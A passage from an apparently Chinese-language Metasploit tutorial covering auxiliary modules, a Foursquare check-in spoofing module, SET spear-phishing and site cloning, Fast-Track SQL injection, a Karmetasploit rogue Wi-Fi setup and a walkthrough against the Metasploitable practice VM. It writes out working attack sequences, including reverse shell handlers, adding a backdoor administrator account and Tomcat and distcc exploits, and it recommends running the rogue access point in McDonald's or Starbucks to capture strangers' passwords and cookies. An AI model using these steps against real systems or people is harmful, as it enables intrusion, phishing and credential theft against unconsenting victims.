<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="九msf-附加模块">九．MSF 附加模块<a href="#九msf-附加模块" class="hash-link" aria-label="九．MSF 附加模块的直接链接" title="九．MSF 附加模块的直接链接">​</a></h2>
<p>包括端口扫描，服务探测，弱口令探测，fuzzer，sql注射等。附加模块没有payload。
模块保存在/opt/framework3/msf3/modules/auxiliary/目录中的各个子目录下。
可用命令查看全部可用附加模块：<code>msf&gt; show auxiliary</code></p>
<p>例子：
o```
msf&gt; use scanner/http/webdav_scanner
info
show options
set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222
run</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">搜索所有http相关扫描模块：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`search scanner/http`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">附加模块深层剖析：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>cd /opt/framework3/msf3/modules/auxiliary/admin/
wget <a href="http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb" target="_blank" rel="noopener noreferrer">http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb</a></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">代码分析:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">```ruby</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary #导入Auxiliaary类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#Exploit mixins should be called first</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::HttpClient #导入HTTPClient方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Auxiliary::Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Name’ =&gt; ‘Foursquare Location Poster’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Version’ =&gt; ‘$Revision:$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Description’ =&gt; ‘F*ck with Foursquare,be anywhere you want to be by venue id’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Author’ =&gt; [‘CG’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘License’ =&gt; MSF_LICENSE,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘References’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://groups.google.com/group/foursquare-api’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://www.mikekey.com/im-a-foursquare-cheater/’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#todo pass in geocoords instead of venueid,create a venueid, other tom foolery</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Opt::RHOST(‘api.foursquare.com’),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘VENUEID’,[true,’foursquare venueid’,’185675’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘USERNAME’,[true,’foursquare username’,’username’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘PASSWORD’,[true,’foursquare password’,’password’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">begin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user = datastore[‘USERNAME’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pass = datasore[‘PASSWORD’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">venid = datastore[‘VENUEID’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user_pass = Rex::Text.encode_base64(user + “:” + pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decode = Rex::Text.decode_base64(user_pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">postrequest = “twitter=1\n” #add facebook=1 if you want facebook</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Encode User/Pass: #{user_pass}”) #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Decode User/Pass: #{decode}”)  #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">res = send_request_cgi({</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘uri’ =&gt; “/v1/checkin?vid=#{venid}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘version’ =&gt; “1.1”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘method’ =&gt; ‘POST’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘data’ =&gt; postrequest,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘headers’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Authorization’ =&gt; “Basic #{user_pass}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Proxy-Connection’ =&gt; “Keep-Alive”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">},25)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“#{res}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Timeout::Error, ::Errno::EPIPE =&gt;e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pus e.message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre></div></div>
<p>ruby白痴一个，代码我也没看懂，不解释了</p>
<p>如何使用：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use admin/foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set VENUEID 2584421</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set USERNAME msf@elwood.net</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD ilovemetasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十社会工程学工具集set">十．社会工程学工具集（SET）<a href="#十社会工程学工具集set" class="hash-link" aria-label="十．社会工程学工具集（SET）的直接链接" title="十．社会工程学工具集（SET）的直接链接">​</a></h2>
<p>主要功能：hacking the human mind。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1set基本配置">1、SET基本配置：<a href="#1set基本配置" class="hash-link" aria-label="1、SET基本配置：的直接链接" title="1、SET基本配置：的直接链接">​</a></h3>
<p>SET位于/pentest/exploits/set/目录</p>
<p>更新：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/exploits/set/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">svn update</span><br></span></code></pre></div></div>
<p>配置文件config/set_config，当使用基于web的攻击方式时可以将email功能打开：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vi config/set_config:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">METASPLOIT_PATH=/opt/framework3/msf3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WEBATTACK_EMAIL=ON</span><br></span></code></pre></div></div>
<p>使用Java applet attack进行攻击的时候默认使用Microsoft作为发布者名称，如果需要自定义则需要安装JDK并打开配置项：</p>
<p><code>SELF_SIGNED_APPLET=ON</code></p>
<p>SET默认打开AUTO_DETECT项，自动探测本机IP并用于攻击中的各项配置。如果本机是多网卡需要手动指定IP，则需将此项关闭：</p>
<p><code>AUTO_DETECT=OFF</code></p>
<p>SET默认使用内建的python提供的web server供使用，如需使用apache作为服务则需要本机安装apache并打开配置项：</p>
<p><code>APACHE_SERVER=ON</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2网络钓鱼攻击">2、网络钓鱼攻击:<a href="#2网络钓鱼攻击" class="hash-link" aria-label="2、网络钓鱼攻击:的直接链接" title="2、网络钓鱼攻击:的直接链接">​</a></h3>
<p>Spear-Phishing Attack Vector,利用文件格式漏洞（如PDF）等生成后门并通过email（GMAIL,SENDMAIL,）向目标发送带后门附件的电子邮件，诱使目标打开附件激活后门。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./set</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">此时选择菜单1.Spear-Phishing Attack Vectors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">继续选择：1.Perform a Mass Email Attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择exploit：8.Adobe Collab.collectEmailInfo Buffer Overflow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择payload：4.Windows Reverse TCP Shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否更改文件名：1.Keep the filename</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发送邮件方式1.Email Attack Single Email Address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择邮件模板1.Pre-Defined Template</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5.Status Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入收件方email地址：webmanager@exmaple.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发件方式：1.Use a GMAIL Account for your email attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入发件gmail和密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否立即监听端口等待连接:yes</span><br></span></code></pre></div></div>
<p>此时SET会使用刚才的设定全自动监听指定端口。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3web方式攻击">3、WEB方式攻击：<a href="#3web方式攻击" class="hash-link" aria-label="3、WEB方式攻击：的直接链接" title="3、WEB方式攻击：的直接链接">​</a></h3>
<p>SET可以克隆一个网站并植入后门以此迷惑目标打开此网站并中招。</p>
<ul>
<li>Java Applet方式：最成功的方式之一，并不是利用java的漏洞，而是当目标浏览含后门的仿冒站点时会被询问是否允许执行web中的java applet，一旦点击允许则payload开始运行，目标将被重定向到真实的网站。</li>
<li>用户端（Client-side）web exploit方式：利用用户端存在的软件漏洞，一般使用0day进行攻击的效果最好。</li>
<li>账号密码获取（Username and Password Harvesting）：通过克隆一个目标站并诱使 攻击目标登陆，截获其账号密码。例如截获GMAIL密码。</li>
<li>标签页绑架（Tabnabbing）：当目标打开多个标签页浏览网站并切换标签页时，网站侦测到目标的行为并显示让目标等待的信息，恰好目标打开了被绑架的标签页并要求在相似程度惊人的网站里输入登陆凭据，当目标输入之后登陆信息即被截获，同时被重定向到真实网站。</li>
<li>中间人攻击（Man-Left-in-the-Middle）：此方式使用已经被攻陷的网站的HTTP请求或者网站的XSS漏洞让用户的登陆信息发送至攻击者的HTTP服务器。如果你发现了一个网站的XSS漏洞，可以利用此漏洞构造一个url发送给目标诱使其打开并登陆以截获登陆信息。</li>
<li>Web Jacking：当目标打开我们的网站时会有一个链接显示为正确的web地址，此时若目标打开此仿冒链接会被定向到我们的仿冒网站，其登陆信息会被截获。</li>
<li>混合模式（multi-attack）：可同时使用以上多种攻击手段以提高成功率。</li>
<li>介质感染攻击（Infectious Media Generator）：可以让你生成一张光盘或者u盘，里面包含autorun.inf来运行指定的后门文件或者file-format漏洞文件。</li>
<li>迷你USB人机接口设备（Teensy USB HID）：当电脑插入USB设备且autorun.inf被禁用时，可使用此方法将USB设备模拟成一个键盘或鼠标设备，进而截获目标机器的击键记录。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="set其他特殊功能">SET其他特殊功能：<a href="#set其他特殊功能" class="hash-link" aria-label="SET其他特殊功能：的直接链接" title="SET其他特殊功能：的直接链接">​</a></h3>
<p>包括SET交互式shell，可用来替代meterpreter；远程管理工具（RATTE）；HTTP隧道，当目标主机只开放HTTP端口对外放行时可通过此功能与主机进行通信；WEB-GUI，包含了常用攻击和无线攻击向导，输入./set-web即可  运行。</p>
<p>（SET新版本变动较大，请自行摸索。）</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十一fast-track">十一．FAST-TRACK<a href="#十一fast-track" class="hash-link" aria-label="十一．FAST-TRACK的直接链接" title="十一．FAST-TRACK的直接链接">​</a></h2>
<p>Fast-Track和SET一样都是python编写的，同样是使用MSF提供的payload以及用户端攻击向导等，作为对MSF的补充，它提供了如MSSQL攻击，更多的exploit，浏览器攻击向导等。fasttrack位于/pentest/exploits/fasttrack/。</p>
<p>交互式模式：<code>./fast-track.py -i</code></p>
<p>命令行模式：<code>./fast-track.py -c</code></p>
<p>Web界面模式：<code>./fast-track.py -g</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1mssql工具">1、MSSQL工具：<a href="#1mssql工具" class="hash-link" aria-label="1、MSSQL工具：的直接链接" title="1、MSSQL工具：的直接链接">​</a></h3>
<p>MSSQL注入漏洞攻击：</p>
<p>攻击时你只需要输入有注入漏洞的url地址，地址里面用INJECTHERE标识可注入字段，如<a href="http://example.com/show.asp?id=INJECTHERE&amp;date=2012%EF%BC%8Cfast-track%E4%BC%9A%E5%85%A8%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%80%E6%97%A6%E6%88%90%E5%8A%9F%E4%BC%9A%E7%BB%99%E4%BD%A0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AAcmd" target="_blank" rel="noopener noreferrer">http://example.com/show.asp?id=INJECTHERE&amp;date=2012，fast-track会全自动注入，一旦成功会给你返回一个cmd</a> shell。
注入也支持POST参数，如果是POST的话更加简单，只需要你输入url地址，fast-track会自动判断并尝试进行注入。</p>
<p>SQL暴力破解：另外一个实用的功能是暴力破解器（MSSQL Bruter），可以寻找mssql弱口令，一旦获取到一个sa权限的访问权限，将自动返回一个shell。</p>
<p>SQL注入批量扫描器（SQLPwnage）：此功能可扫描指定网段的所有打开80端口的主机，并扫描是否存在sql注入点，一旦 发现注入点将自动尝试攻击并通过xp_cmdshell获取系统权限。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2binary-hex-转换器">2、Binary-HEX 转换器：<a href="#2binary-hex-转换器" class="hash-link" aria-label="2、Binary-HEX 转换器：的直接链接" title="2、Binary-HEX 转换器：的直接链接">​</a></h3>
<p>当你已经进入一个系统且需要上传可执行文件上去，就可以使用这个工具将可执行的二 进制文件转换为HEX十六进制编码，然后复制粘贴过去即可。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3批量用户端攻击">3、批量用户端攻击：<a href="#3批量用户端攻击" class="hash-link" aria-label="3、批量用户端攻击：的直接链接" title="3、批量用户端攻击：的直接链接">​</a></h3>
<p>和浏览器攻击差不多，但是增加了对目标的ARP缓冲区和DNS感染（只能是在测试者 和目标处于同一网段的情况下），以及MSF里面没有的浏览器溢出exploit。当目标浏览 恶意网站的时候，fast-track尝试着使用所有的exp对目标机器进行溢出，一旦某个exp 起作用将获取到目标机器的控制权限。</p>
<p>（新版本fasttrack中还加入了Autopwn Automation、Nmap Scripting Engine、Exploits、Payload Generator等新功能。）</p>
<p>脚本化的工具有时确实能减少很多工作时间，但是不能完全依赖于这类自动程度很高的工具，特别是在用这些工具搞不定目标的时候，手工测试的能力往往才是王道，细节决定成败。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十二karmerasploit">十二．KARMERASPLOIT<a href="#十二karmerasploit" class="hash-link" aria-label="十二．KARMERASPLOIT的直接链接" title="十二．KARMERASPLOIT的直接链接">​</a></h2>
<p>Karmetasploit = Karma + Metasploit，也可以说成它是MSF的KARMA实现。</p>
<p>Karma和MSF一样也是使用ruby语言编写的，其功能是建立一个虚假的无线接入点，等待 目标连接上钩。与MSF结合可实现更强大的功能。Karmetasploit集成了DNS,POP3，IMAP4，SMTP,FTP,SMB,HTTP等服务用于攻击，模块位于modules/auxiliary/server目录下。</p>
<p>基本配置：</p>
<p>需要的配置不多，首先需要配置一个DHCP服务为目标提供动态IP分配，配置文件：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default-lease-time 60;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max-lease-time 72;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ddns-update-style none;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">authoritative;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log-facility local7;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">subnet 10.0.0.0 netmask 255.255.255.0 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">range 10.0.0.100 10.0.0.254;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option routers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>将配置文件保存在/etc/dhcp3/dhcpd.conf</p>
<p>下一步下载karma  msf脚本：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.offensive-security.com/downloads/karma.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#将网卡激活为监听模式：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airmon-ng start wlan0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#创建伪装接入点,-P 可被扫描到，-C 信号发射速率，-e 接入点名称（需要具有欺骗性），-v 指定网卡，mon0为上一步完成后生成的：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airbase-ng -P -C 30 -e &quot;China-Net-Free&quot; -v mon0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#此时会生成一个名为at0的新网卡接口。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#接着打开DHCP服务：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#检查是否成功启动：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ps aux|grep dhcpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tail -f /var/log/messages</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#下一步加载karma脚本：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource karma.rc</span><br></span></code></pre></div></div>
<p>等待收获：</p>
<p>当对方打开邮件客户端并登陆收取邮件，那么他的账户密码将被截获，因为他所连接的DNS和POP3都是虚假的。
当对方打开浏览器准备浏览网页时karma开始截取cookie，建立虚假email，DNS等服务，加载exploits来对付客户端浏览器，如果走运的话可以获取到shell。
总结：建议这招可以拿到麦当劳，星巴克用，效果更好。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十三构建自己的模块编写自己的exploitmeterpreter脚本编程">十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程<a href="#十三构建自己的模块编写自己的exploitmeterpreter脚本编程" class="hash-link" aria-label="十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程的直接链接" title="十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程的直接链接">​</a></h2>
<p>这三章留着后面看，需要有ruby基础等编程基础。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十四渗透实战演习">十四．渗透实战演习<a href="#十四渗透实战演习" class="hash-link" aria-label="十四．渗透实战演习的直接链接" title="十四．渗透实战演习的直接链接">​</a></h2>
<p>首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable：</p>
<p><a href="http://updates.metasploit.com/data/Metasploitable.zip.torrent" target="_blank" rel="noopener noreferrer">http://updates.metasploit.com/data/Metasploitable.zip.torrent</a></p>
<p>虚拟机IP：172.16.32.162 用户名密码：msfadmin</p>
<p>WINXP：172.16.32.131   开放80端口 有防火墙</p>
<p>情报收集：</p>
<p><code>nmap -sT -P0 172.16.32.131</code></p>
<p>msfconsole：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework3/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.15.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit -j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run getgui -e -f 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net localgroup administrators msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upload nmap.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap.exe -sT -A -P0 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smtp/smtp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS  172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search tomcat_mgr_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhosts 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set threads 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use multi/http/tomcat_mgr_deploy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set password tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set username tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 9999</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_bind_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search distcc_exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.16.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload cmd/unix/reverse</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十五常用命令备忘">十五．常用命令备忘<a href="#十五常用命令备忘" class="hash-link" aria-label="十五．常用命令备忘的直接链接" title="十五．常用命令备忘的直接链接">​</a></h2>
